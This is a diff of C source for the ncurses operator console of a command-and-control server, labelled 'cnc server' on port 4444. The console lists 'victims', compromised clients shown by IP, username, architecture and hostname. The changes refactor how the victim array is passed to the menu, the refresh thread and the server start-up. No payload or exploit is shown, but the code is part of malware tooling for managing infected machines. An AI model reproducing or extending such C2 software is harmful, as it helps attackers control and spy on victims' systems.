@@ -195,12 +195,12 @@ char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3){
   return result;
 }
 
-bool ncurses_item_victims(ITEM **items){
+bool ncurses_item_victims(ITEM **items, net_client_beacon_t **p_victims){
   int j = 0;
   for(int i = 0; i < NET_MAX_CLIENTS; ++i){
     if (p_victims[i] != NULL){
-      items[j] = new_item(ncurses_victim_desc_0(p_victims[i]->sysinfo.ip,
-                                                p_victims[i]->sysinfo.username),
+      items[j] = new_item(ncurses_victim_desc_0(p_victims[i]->sysinfo.username,
+                                                p_victims[i]->sysinfo.ip),
                           ncurses_victim_desc_1(p_victims[i]->sysinfo.arch,
                                                 p_victims[i]->sysinfo.release,
                                                 p_victims[i]->sysinfo.hostname,
@@ -217,7 +217,7 @@ bool ncurses_item_victims(ITEM **items){
 #define NCURSES_WMAIN
 #endif
 
-bool ncurses_wmain(int action){
+bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
   int y, x;
   if (action == NCURSES_WMAIN_INIT){
     if(putenv("TERM=linux") != 0){
@@ -233,7 +233,7 @@ bool ncurses_wmain(int action){
       fprintf(stderr, "[x] %s\n", strerror(errno));
       return false;
     }
-    if (net_server_async(4444) == false){
+    if (net_server_async(4444, p_victims) == false){
       fprintf(stderr, "[x] failed to start cnc server!\n");
       return false;
     }
@@ -262,7 +262,7 @@ bool ncurses_wmain(int action){
     ncurses_window_title(win_main, win_main_title);
     ncurses_window_footer(win_main, win_main_version);
     items = (ITEM **)calloc(NET_VICTIMS_TOTAL, sizeof(ITEM *));
-    ncurses_item_victims(items);
+    ncurses_item_victims(items, p_victims);
     menu = new_menu((ITEM **)items);
     wmove(win_menu, 4, 2);
     wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
@@ -283,9 +283,17 @@ bool ncurses_wmain(int action){
   return false;
 }
 
-void *ncurses_pthread_wmain_auto_refresh(){
+#ifndef NCURSES_PTHREAD_REFRESH
+typedef struct{
+  net_client_beacon_t **p_victims;
+} ncurses_pthread_refresh_args_t;
+#define NCURSES_PTHREAD_REFRESH
+#endif
+
+void *ncurses_pthread_refresh(void *args){
+  ncurses_pthread_refresh_args_t *p_args = args;
   while (true){
-    ncurses_wmain(NCURSES_WMAIN_UPDATE);
+    ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims);
     sleep(1);
   }
   pthread_exit(NULL);
@@ -296,29 +304,30 @@ bool ncurses_main(){
     :TODO: main ncurses interface
     :returns: boolean
   */
+
   int key;
-  ncurses_wmain(NCURSES_WMAIN_INIT);
-  ncurses_wmain(NCURSES_WMAIN_UPDATE);
-  pthread_t t_ncurses_pthread_wmain_auto_refresh;
-  if (pthread_create(&t_ncurses_pthread_wmain_auto_refresh,
-                     NULL,
-                     ncurses_pthread_wmain_auto_refresh,
-                     NULL)){
-    fprintf(stderr, "[x] %s\n", strerror(errno));
-    return false;
-  }
+  
+  net_client_beacon_t **p_victims = net_create_victims();
+  
+  ncurses_wmain(NCURSES_WMAIN_INIT, p_victims);
+
+  pthread_t t_ncurses_pthread_refresh;
+  ncurses_pthread_refresh_args_t *p_ncurses_pthread_refresh_args = malloc(sizeof(ncurses_pthread_refresh_args_t));
+  p_ncurses_pthread_refresh_args->p_victims = p_victims;
+  pthread_create(&t_ncurses_pthread_refresh, NULL, ncurses_pthread_refresh, p_ncurses_pthread_refresh_args);
+  
   while(true){
     key = getch();
     if (key == KEY_RESIZE){
-      ncurses_wmain(NCURSES_WMAIN_UPDATE);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
     }
     if (key == KEY_DOWN){
       menu_driver(menu, REQ_DOWN_ITEM);
-      ncurses_wmain(NCURSES_WMAIN_UPDATE);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
     }
     if (key == KEY_UP){
       menu_driver(menu, REQ_UP_ITEM);
-      ncurses_wmain(NCURSES_WMAIN_UPDATE);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
     }
   }
   ncurses_menu_cleanup(menu);
